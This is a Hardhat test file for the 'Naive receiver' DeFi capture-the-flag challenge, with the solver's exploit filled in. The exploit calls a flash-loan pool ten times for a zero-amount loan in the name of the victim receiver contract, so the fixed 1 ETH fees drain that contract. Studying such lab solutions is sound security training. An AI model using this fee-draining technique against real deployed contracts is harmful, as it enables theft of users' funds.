const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Naive receiver', function () {
    let deployer, user, attacker;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, attacker] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);

        this.pool = await LenderPoolFactory.deploy();
        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
        
        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));

        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
        
        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */   
        /* Description exploit
        Drain all ETH funds from the user's contract.The NaiveReceiverLenderPool fix fee 1 ETH
        receiver has 10 ETH.So, drain 10 times to pay fee only without get loan amount
        the reciever is NaiveReceiverLenderPool contract because flashLoan function make as external
        to allow call by anyone and check only "borrower.isContract()""
        so,we can use their contract address as receiver and FlashLoanReceiver contract is make for 
        NaiveReceiverLenderPool use to receive ETH and get address from the constructor
        */

        console.log("Balance before exploit");
        let poolBalance = await ethers.provider.getBalance(this.pool.address);
        console.log("NaiveReceiverLenderPool balance :" + ethers.utils.formatEther(poolBalance.toString())); // 1000 ETH

        let receiverBalance = await ethers.provider.getBalance(this.receiver.address);
        console.log("FlashLoanReceiver balance :"+ ethers.utils.formatEther(receiverBalance.toString())); //10 ETH
        
        let attackerBalance = await ethers.provider.getBalance(attacker.address);
        console.log("attacker balance begin :"+ ethers.utils.formatEther(attackerBalance.toString())); //10000 ETH
       
        for(let i=0;i<10;i++){
            await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
        }
      
        console.log("----------------------------------------------");
        console.log("Balance after exploited");
        poolBalance = await ethers.provider.getBalance(this.pool.address);
        console.log("NaiveReceiverLenderPool balance :" + ethers.utils.formatEther(poolBalance.toString())); // 1010 ETH

        receiverBalance = await ethers.provider.getBalance(this.receiver.address);
        console.log("FlashLoanReceiver balance :"+ ethers.utils.formatEther(receiverBalance.toString())); //0 ETH
        
        attackerBalance = await ethers.provider.getBalance(attacker.address);
        console.log("attacker balance :"+ ethers.utils.formatEther(attackerBalance.toString())); //10000 ETH
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // All ETH has been drained from the receiver
        expect(
            await ethers.provider.getBalance(this.receiver.address)
        ).to.be.equal('0');
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});
